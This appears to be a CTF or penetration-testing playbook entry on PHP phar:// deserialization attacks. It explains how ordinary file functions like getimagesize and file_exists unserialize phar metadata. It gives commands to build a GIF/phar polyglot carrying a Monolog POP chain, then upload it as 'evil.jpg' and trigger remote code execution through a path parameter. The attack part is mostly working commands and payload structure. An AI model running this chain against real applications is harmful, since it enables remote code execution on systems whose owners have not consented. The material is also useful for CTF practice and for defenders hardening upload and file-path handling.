# phar:// Deserialization — file-ops trigger, no unserialize() needed

## The mechanism

`phar` archives carry a **metadata block** that PHP runs through
`unserialize()` on ANY phar:// file operation. You never call
`unserialize()` — you make the *application's own file check* deserialize
your archive's metadata.

```
file_exists('phar://uploads/x.phar/a')
is_dir('phar://...')
file_get_contents('phar://...')
fopen('phar://...')
getimagesize('phar://...')       ← even image validation triggers it
mime_content_type('phar://...')
file_exists/is_file/is_readable/stat/md5_file/sha1_file/exif_*
```

Every file function is a potential trigger — including the ones that LOOK
read-only. `getimagesize` on an uploaded image is the classic phar trigger
because the "is it an image" check IS the file-op.

## The two-stage delivery

```
stage 1: upload the .phar with a benign extension (.jpg/.gif/.png/.txt)
         → the upload path stores it
stage 2: pass phar://<stored-path>/dummy as a path argument to ANY file-op
         → the app's own file_exists/is_dir/getimagesize deserializes metadata
```

The upload extension doesn't matter — phar metadata parsing is on the
*stream wrapper*, not the file signature.

## Minting the phar — the repo tool

```bash
python3 tools/web/archive_gen.py phar --metadata '<serialized>' >x.phar
# OR with the repo tool's other output forms — check --help
```

`archive_gen.py` writes a valid phar whose stub passes `getimagesize` (a GIF
magic) and whose metadata block is your serialized object graph. No PHP on
the box needed — the tool builds the byte layout directly.

## The metadata payload — a PHP object graph

The metadata is a PHP-serialized value — the SAME grammar as `unserialize`,
so every POP chain from `php-deser.md`/`php-pop-chains.md` applies unchanged:

```bash
# a Monolog POP chain as the phar metadata
python3 tools/php_ser_gen.py --spec '{
  "O":"Monolog\\Handler\\StreamHandler",
  "props":{"stream":"php://filter/convert.base64-decode/resource=/tmp/x",
           "url":"phar://x.phar","level":0,"bubble":true,"filePermission":null,"_filename":"x"}
}' >meta.ser

python3 tools/web/archive_gen.py phar --metadata "$(cat meta.ser)" >x.jpg
```

## Trigger paths — the parameter that reaches the file-op

Look in source for ANY file-op on a user-controlled path:

```php
file_exists($_GET['f'])                    is_dir($_GET['d'])
file_get_contents($_POST['p'])             readfile($_GET['x'])
getimagesize($_FILES['i']['tmp_name'])     mime_content_type($path)
unlink($p)   rename($p,$q)   copy($p,$q)   include $p (LFI overlap)
```

The path arg becomes `phar://<stored-path>/x`. If the upload is stored at a
known location (`uploads/<name>`), the phar URL is
`phar://uploads/<name>/anything` — the suffix is required syntax but is
never actually read as a file (the metadata is in the phar header).

## The polyglot trick — pass image checks

`archive_gen.py phar` emits a stub that is a valid GIF89a header AND a valid
phar stub. The upload's `getimagesize`/`exif_imagetype`/`finfo` accepts it
as an image; the phar:// wrapper parses it as a phar. Both pass.

```
GIF89a\xNN\xNN\x01\x00          ← image magic (image check passes)
<?php __HALT_COMPILER(); ?>\r\n ← phar stub
[manifest + metadata + file data]
```

## Version gates

```
PHP < 5.3    phar wrapper not enabled by default
PHP ≥ 5.3    phar:// active; metadata unserialize runs
PHP ≥ 7.x    still works
PHP ≥ 8.0    still works — the mechanism is unchanged
phar.readonly=On  → you cannot CREATE a phar server-side, but you can
                    STILL TRIGGER deserialization on an uploaded one —
                    readonly only blocks writing, not reading metadata
```

`phar.readonly=On` is the default and does NOT stop this attack — it stops
`Phar::buildFromDirectory`, not `phar://` reads.

## The chain recipe end-to-end

```bash
# 1. build the POP chain for the app's libraries
python3 tools/php_ser_gen.py --spec '{...}' >meta.ser

# 2. mint the phar-as-image
python3 tools/web/archive_gen.py phar --metadata "$(cat meta.ser)" >evil.jpg

# 3. upload it — the "image" passes validation
curl -F 'f=@evil.jpg' "$BASE/upload"

# 4. trigger ANY file-op on phar://uploads/evil.jpg/x
curl "$BASE/avatar?p=phar://uploads/evil.jpg/x"
#    → getimagesize/is_dir/file_exists deserializes the metadata → POP fires
```

## Where it most often lands in CTF

- "Check whether this file exists" feature (`file_exists`)
- Avatar/upload reprocessing (`getimagesize`, `mime_content_type`)
- Backup/archive import that lists files (`is_file`)
- A `path`/`dir`/`file` param on an admin endpoint that the app `stat`s
- LFI already proven → `phar://` is a scheme the LFI primitive reaches — the
  phar path IS a file path, so LFI → phar → RCE is one hop

## Falsifiers

- The stored file is renamed to a hash you can't predict AND the path arg
  is `basename()`/realpath()-sanitized → phar:// can't reach it.
- The app `realpath()`s the arg before the file-op and `phar://` isn't a
  real path → fails the realpath (returns false) → never reaches the op.
- `open_basedir` blocks the upload directory.
- No file-op ever runs on a user-controlled path AND no upload exists.

## Output to record

- The file-op that fires (the function + where it's called)
- The phar upload path as stored
- The POP chain serialized into the metadata
- The verbatim response / RCE output
